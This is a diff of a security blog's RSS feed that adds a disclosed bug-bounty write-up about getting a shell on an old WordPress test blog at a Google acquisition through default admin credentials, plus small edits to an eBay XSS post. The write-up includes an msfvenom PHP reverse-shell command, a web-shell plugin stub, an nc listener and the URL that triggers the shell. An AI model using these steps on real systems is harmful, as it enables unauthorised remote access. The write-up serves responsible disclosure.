@@ -6,17 +6,109 @@
     <atom:link href="https://r0rshark.github.io/feed.xml" rel="self" type="application/rss+xml" />
     <description></description>
     <language>en-us</language>
-    <pubDate>Sat, 20 Jun 2015 13:48:17 +0000</pubDate>
-    <lastBuildDate>Sat, 20 Jun 2015 13:48:17 +0000</lastBuildDate>
+    <pubDate>Thu, 30 Jul 2015 12:40:17 +0000</pubDate>
+    <lastBuildDate>Thu, 30 Jul 2015 12:40:17 +0000</lastBuildDate>
 
     
     
     <item>
-      <title>Making you sell what I want: Story of an Ebay XSS</title>
-      <link>https://r0rshark.github.io/2015/06/20/ebay/</link>
-      <pubDate>Sat, 20 Jun 2015 00:00:00 +0000</pubDate>
+      <title>Getting a shell on a Google Acquisition</title>
+      <link>https://r0rshark.github.io/2015/07/30/google/</link>
+      <pubDate>Thu, 30 Jul 2015 00:00:00 +0000</pubDate>
       <author></author>
-      <guid>https://r0rshark.github.io/2015/06/20/ebay</guid>
+      <guid>https://r0rshark.github.io/2015/07/30/google</guid>
+      <description>&lt;h3 id=&quot;tldr&quot;&gt;TL;DR&lt;/h3&gt;
+&lt;p&gt;Default Wordpress credentials on an old version of the Adometry blog would have allowed an attacker to upload a PHP shell and execute remote commands.&lt;/p&gt;
+
+&lt;h3 id=&quot;google-dorking&quot;&gt;Google dorking&lt;/h3&gt;
+&lt;p&gt;Instead of studying for the exams last month I tryed to discover some bugs in a Google Acquisition to get my name listed on the &lt;strong&gt;Google Hall of Fame&lt;/strong&gt;. The acquisition which I have targeted is &lt;strong&gt;Adometry by Google&lt;/strong&gt; a SaaS-based marketing attribution and optimization platform. Looking around on their website I have discovered the company blog located at &lt;a href=&quot;http://www.adometry.com/blog/&quot;&gt;http://www.adometry.com/blog/&lt;/a&gt; which runs the &lt;strong&gt;latest version of Wordpress&lt;/strong&gt;.
+Since the bugs are often located in hidden and old pages of the website let’s give them a look. A very useful way to discover these pages is Google itself. Using some operands like &lt;code&gt;site:&lt;/code&gt; or &lt;code&gt;inurl:&lt;/code&gt; and combining these with the &lt;code&gt;interval of dates filter&lt;/code&gt; it is possible to discover old pages of a particular website. Let’s try it: &lt;code&gt;site:adometry.com&lt;/code&gt; and set the interval of date in the past but not that much. Besides the pages which simply redirect to the main website I have noticed something strange:&lt;/p&gt;
+
+&lt;div class=&quot;full zoomable&quot;&gt;
+  &lt;img src=&quot;/images/google/blog2013.png&quot; /&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;the-wordpress-test-blog&quot;&gt;The Wordpress test blog&lt;/h3&gt;
+&lt;p&gt;The first thing that I have noticed was the title of the blog  &lt;strong&gt;Test | Just another WordPress site - Adometry&lt;/strong&gt; which contains the magic keyword that every Penetration Tester/Bug Hunter is looking for: &lt;strong&gt;Test&lt;/strong&gt; that in many case means vulnerable as hell. The second thing that I have noticed is that the url of this blog &lt;a href=&quot;http://www.adometry.com/blog2013/&quot;&gt;http://www.adometry.com/blog2013/&lt;/a&gt; is different from the official one that I have discovered before. By inspecting the source code of the page I discovered that the &lt;strong&gt;Wordpress version was the 3.5.1&lt;/strong&gt; that has a lot of vulnerabilities like XSS XXE CSRF and maybe a &lt;a href=&quot;https://vagosec.org/2013/12/wordpress-rce-exploit/&quot;&gt;RCE&lt;/a&gt;, but  I am a lazy guy, out there it was very hot, and I would like to go for a swim so I tryed to find an easier way in. I know for sure this was just a testing blog and so what are the &lt;strong&gt;classical credetials&lt;/strong&gt; for a testing thing? The default ones and in the case of Wordpress the classical &lt;strong&gt;admin:admin&lt;/strong&gt;. Let’s give them a shot and here we are:&lt;/p&gt;
+&lt;div class=&quot;full zoomable&quot;&gt;
+  &lt;img src=&quot;/images/google/wordpress.png&quot; /&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;getting-a-shell&quot;&gt;Getting a shell&lt;/h3&gt;
+&lt;p&gt;The easiest way to get a shell once you have admin access to a Wordpress blog is to &lt;strong&gt;upload a custom plugin&lt;/strong&gt; containing a reverse shell, enable it and visit the page which runs it:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Create a &lt;strong&gt;php reverse shell&lt;/strong&gt; using msfvenom and name the file shell.php:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code&gt;
+msfvenom -p php/meterpreter_reverse_tcp LHOST=Your IP LPORT=Your Port -f raw &amp;gt; shell.php
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Add comments on the top of the shell.php to &lt;strong&gt;make it a valid plugin&lt;/strong&gt; and compress it in zip format&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;*     Plugin Name: My Shell&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;*     Plugin URI: https://github.com/r0rshark/wordpress-shell&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;*     Description: Execute Commands as the webserver you are serving wordpress with&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;*     Author: r0rshark&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;*     Version: 0.2&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;*     Author URI: https://r0rshark.github.io&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;*                             */&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$ipaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;Your IP&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Your&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+      &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set_time_limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ignore_user_abort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ini_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;max_execution_time&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ini_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;disable_functions&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
+      &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Upload and enable the plugin&lt;/strong&gt; in the Wordpress dashboard&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&quot;full zoomable&quot;&gt;
+  &lt;img src=&quot;/images/google/wordpress_plugin.png&quot; /&gt;
+&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Setup a listener&lt;/strong&gt; at your ip and port used in the msfvenom command:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code&gt;
+nc -lvp port
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Execute the reverse shell&lt;/strong&gt; by visiting www.adometry.com/blog2013/wp-content/plugins/shell/shell.php&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;full zoomable&quot;&gt;
+  &lt;img src=&quot;/images/google/shell.png&quot; /&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;maybe-getting-root&quot;&gt;Maybe getting root&lt;/h3&gt;
+&lt;p&gt;In the previous picture it is possible to see the current kernel version running on that machine which is the &lt;strong&gt;2.6.32&lt;/strong&gt;. I think that there are known &lt;strong&gt;public exploits&lt;/strong&gt; to get a root shell exploiting vulnerabilities in this kernel version. For example I have tested  &lt;a href=&quot;https://www.exploit-db.com/exploits/15704/&quot;&gt;this&lt;/a&gt; on a 2.6.31 kernel and since the exploit has been created to work with kernel &amp;lt; 2.6.37 I suppose that it can work as well. Obviously I haven’t tried it because I think this would go beyond of the Bug Bounty scope.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;1 July 2015 Vulnerability reported to the Google Security Team&lt;/li&gt;
+  &lt;li&gt;2 July 2015 Vulnerability patched&lt;/li&gt;
+  &lt;li&gt;9 July 2015 Got reward of $3133.7&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+    </item>
+    
+    
+    
+    <item>
+      <title>Making you sell what I want: Story of an Ebay XSS</title>
+      <link>https://r0rshark.github.io/2015/06/19/ebay/</link>
+      <pubDate>Fri, 19 Jun 2015 00:00:00 +0000</pubDate>
+      <author></author>
+      <guid>https://r0rshark.github.io/2015/06/19/ebay</guid>
       <description>&lt;h3 id=&quot;tldr&quot;&gt;TL;DR&lt;/h3&gt;
 &lt;p&gt;A XSS vulnerability in Ebay can be exploited by an attacker to bypass CSRF protection and make a victim sell unwanted items.
 This is a pretty basic technique but it could be interesting for people which have just entered in the Bug Bounty world.&lt;/p&gt;
@@ -26,7 +118,7 @@ This is a pretty basic technique but it could be interesting for people which ha
 First of all why have I chosen to test Ebay? Simple:&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;The Ebay website was first &lt;strong&gt;developed lots of time ago&lt;/strong&gt; when the word &lt;code&gt;&quot;security&quot;&lt;/code&gt; was not so popular and there weren’t beatiful frameworks which prevents developer to make shit happen;&lt;/li&gt;
+  &lt;li&gt;The Ebay website was first &lt;strong&gt;developed lots of time ago&lt;/strong&gt; when the word &lt;code&gt;&quot;security&quot;&lt;/code&gt; was not so popular and there weren’t beatiful frameworks which prevents developers to make shit happen;&lt;/li&gt;
   &lt;li&gt;Ebay is a pretty high level profile website and has a &lt;strong&gt;Bug Bounty program&lt;/strong&gt; which awards with a mention in their Security Researchers Acknowledgement page;&lt;/li&gt;
   &lt;li&gt;Ebay doens’t offer a cash award (yes this doesn’t seem to be a pro but this means that &lt;strong&gt;not so many people have tested it&lt;/strong&gt; unlike Google and Facebook);&lt;/li&gt;
 &lt;/ul&gt;
@@ -148,15 +240,15 @@ We modify the payload before and instead of displaying an alert message (&lt;cod
     &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;Hooray!! We have made the victim which click on our link sell an Iphone 6.
+&lt;p&gt;Hooray!! We have made the victim, which click on our link, sell an Iphone 6.
 &lt;strong&gt;Kudos to the Ebay security team&lt;/strong&gt; which has been very responsive and patched the vulnerability in a week.
-I think that at the moment the security level of Ebay is not enough strong considering the sensitive informations and the profitable actions which the platform provide, so I keep wondering why Ebay hasn’t already started a  payment based Bug Bounty program on platforms like Hackerone or Bugcrowd.&lt;/p&gt;
+I think that, at the moment, the security level of Ebay is not enough strong considering the sensitive informations and the profitable actions which the platform provide, so I keep wondering why Ebay hasn’t already started a  payment based Bug Bounty program on platforms like Hackerone or Bugcrowd.&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;7 April 2015 Vulnerability reported to Ebay Security Team&lt;/li&gt;
   &lt;li&gt;15 April 2015 Vulnerability patched&lt;/li&gt;
   &lt;li&gt;25 May 2015 Added to the Responsible Disclosure Acknowledgements page&lt;/li&gt;
-  &lt;li&gt;18 June 2015 Public disclosure&lt;/li&gt;
+  &lt;li&gt;20 June 2015 Public disclosure&lt;/li&gt;
 &lt;/ul&gt;
 
 </description>
